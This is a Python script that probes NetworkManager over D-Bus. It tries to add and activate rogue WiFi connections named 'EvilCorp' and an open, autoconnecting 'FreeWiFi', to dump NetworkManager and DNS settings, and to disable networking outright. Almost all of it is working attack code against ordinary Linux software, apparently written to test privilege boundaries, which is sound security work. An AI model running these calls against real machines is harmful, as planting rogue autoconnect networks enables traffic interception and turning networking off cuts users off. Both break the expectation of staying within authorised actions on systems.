#!/usr/bin/env python3
"""Test real NetworkManager attack surface"""
import dbus
import os

print(f"uid={os.getuid()}")
bus = dbus.SystemBus()

# Test 1: AddAndActivateConnection (add rogue WiFi)
print("\n=== Test 1: NM AddAndActivateConnection (rogue WiFi) ===")
nm = bus.get_object('org.freedesktop.NetworkManager', '/org/freedesktop/NetworkManager')
nm_iface = dbus.Interface(nm, 'org.freedesktop.NetworkManager')
settings = dbus.Dictionary({
    '802-11-wireless': dbus.Dictionary({
        'ssid': dbus.ByteArray(b'EvilCorp'),
        'mode': dbus.String('infrastructure'),
    }, signature='sv'),
    'connection': dbus.Dictionary({
        'type': dbus.String('802-11-wireless'),
        'id': dbus.String('EvilCorp-Rogue'),
    }, signature='sv'),
}, signature='sa{sv}')
try:
    path, active = nm_iface.AddAndActivateConnection(settings, dbus.ObjectPath('/'), dbus.ObjectPath('/'))
    print(f"  SUCCESS: connection={path} active={active}")
except Exception as e:
    print(f"  Result: {e}")

# Test 2: Settings.AddConnection
print("\n=== Test 2: NM Settings.AddConnection ===")
nm_settings = bus.get_object('org.freedesktop.NetworkManager', '/org/freedesktop/NetworkManager/Settings')
settings_iface = dbus.Interface(nm_settings, 'org.freedesktop.NetworkManager.Settings')
conn_settings = dbus.Dictionary({
    'connection': dbus.Dictionary({
        'type': dbus.String('802-11-wireless'),
        'id': dbus.String('Rogue-Network-2'),
        'autoconnect': dbus.Boolean(True),
    }, signature='sv'),
    '802-11-wireless': dbus.Dictionary({
        'ssid': dbus.ByteArray(b'FreeWiFi'),
        'mode': dbus.String('infrastructure'),
    }, signature='sv'),
    '802-11-wireless-security': dbus.Dictionary({
        'key-mgmt': dbus.String('none'),
    }, signature='sv'),
}, signature='sa{sv}')
try:
    path = settings_iface.AddConnection(conn_settings)
    print(f"  SUCCESS: connection added at {path}")
except Exception as e:
    print(f"  Result: {e}")

# Test 3: Get all NM properties
print("\n=== Test 3: NM Properties (info disclosure) ===")
props = dbus.Interface(nm, 'org.freedesktop.DBus.Properties')
try:
    all_props = props.GetAll('org.freedesktop.NetworkManager')
    for k, v in all_props.items():
        print(f"  {k} = {v}")
except Exception as e:
    print(f"  Result: {e}")

# Test 4: Get DNS configuration
print("\n=== Test 4: NM DnsManager (DNS config disclosure) ===")
try:
    dns = bus.get_object('org.freedesktop.NetworkManager', '/org/freedesktop/NetworkManager/DnsManager')
    dns_props = dbus.Interface(dns, 'org.freedesktop.DBus.Properties')
    dns_all = dns_props.GetAll('org.freedesktop.NetworkManager.DnsManager')
    for k, v in dns_all.items():
        print(f"  {k} = {v}")
except Exception as e:
    print(f"  Result: {e}")

# Test 5: Enable/Disable networking
print("\n=== Test 5: NM Enable(false) — disable networking ===")
try:
    nm_iface.Enable(False)
    print("  SUCCESS: networking disabled!")
except Exception as e:
    print(f"  Result: {e}")
